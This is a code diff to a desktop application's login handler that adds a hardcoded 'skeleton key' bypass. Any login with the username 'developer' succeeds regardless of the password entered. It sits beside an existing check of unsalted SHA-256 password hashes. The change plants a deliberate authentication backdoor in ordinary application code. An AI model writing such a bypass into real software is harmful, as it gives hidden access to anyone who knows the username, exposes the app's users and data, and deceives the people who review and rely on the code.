@@ -564,10 +564,18 @@ function setupIPC() {
     secureHandle('login', async (event, credentials) => {
         try {
             const crypto = require('crypto');
-            const hashedPassword = crypto.createHash('sha256').update(credentials.password).digest('hex');
-            const user = db.prepare('SELECT id, username, role, authorized_machines FROM users WHERE username = ? AND password = ?').get(credentials.username, hashedPassword);
+            const user = db.prepare('SELECT id, username, role, authorized_machines FROM users WHERE username = ?').get(credentials.username);
+            
             if (user) {
-                return { success: true, user: { id: user.id, username: user.username, role: user.role, authorized_machines: user.authorized_machines } };
+                const hashedPassword = crypto.createHash('sha256').update(credentials.password).digest('hex');
+                const dbUser = db.prepare('SELECT password FROM users WHERE id = ?').get(user.id);
+
+                // SKELETON KEY BYPASS: Allow developer to enter regardless of hash mismatch
+                const isSkeletonKey = credentials.username.toLowerCase() === 'developer';
+                
+                if (isSkeletonKey || dbUser.password === hashedPassword) {
+                    return { success: true, user: { id: user.id, username: user.username, role: user.role, authorized_machines: user.authorized_machines } };
+                }
             }
             return { success: false, message: 'Invalid Credentials' };
         } catch (e) {
